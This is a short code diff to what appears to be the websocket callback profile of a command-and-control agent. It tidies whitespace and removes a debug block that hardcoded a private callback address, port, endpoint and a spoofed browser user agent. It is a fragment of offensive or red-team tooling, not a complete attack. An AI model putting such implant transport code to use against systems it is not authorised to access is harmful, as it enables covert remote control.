@@ -17,7 +17,7 @@ namespace Agent.Profiles.Websocket
         private string endpoint { get; set; }
         private string userAgent { get; set; }
         private string hostHeader { get; set; }
-        public int connectAttempt { get; set; }    
+        public int connectAttempt { get; set; }
         public int maxAttempts { get; set; }
         private WebsocketClient _client { get; set; }
         private CancellationTokenSource cancellationTokenSource { get; set; } = new CancellationTokenSource();
@@ -39,21 +39,6 @@ namespace Agent.Profiles.Websocket
             this.hostHeader = "%HOSTHEADER%";
             this.maxAttempts = 5;
             this.connectAttempt = 0;
-
-#if DEBUG
-            this.agentConfig = config;
-            this.crypt = crypto;
-            this.logger = logger;
-            this.messageManager = messageManager;
-            callbackPort = Int32.Parse("8081");
-            callbackHost = "ws://10.30.25.21";
-            this.endpoint = "socket";
-            this.url = $"{callbackHost}:{callbackPort}/{this.endpoint}";
-            this.userAgent = "Mozilla/5.0 (Windows NT 6.3; Trident/7.0; rv:11.0) like Gecko\r\n";
-            this.hostHeader = "";
-            this.maxAttempts = 5;
-            this.connectAttempt = 0;
-#endif
 
             var factory = new Func<ClientWebSocket>(() =>
             {
@@ -102,7 +87,7 @@ namespace Agent.Profiles.Websocket
 
             this._client.ReconnectionHappened.Subscribe(info =>
             {
-               logger.Log($"Reconnection happened, type: {info.Type}, url: {url}");
+                logger.Log($"Reconnection happened, type: {info.Type}, url: {url}");
             });
             this._client.DisconnectionHappened.Subscribe(info =>
                 logger.Log($"Disconnection happened, type: {info.Type}"));
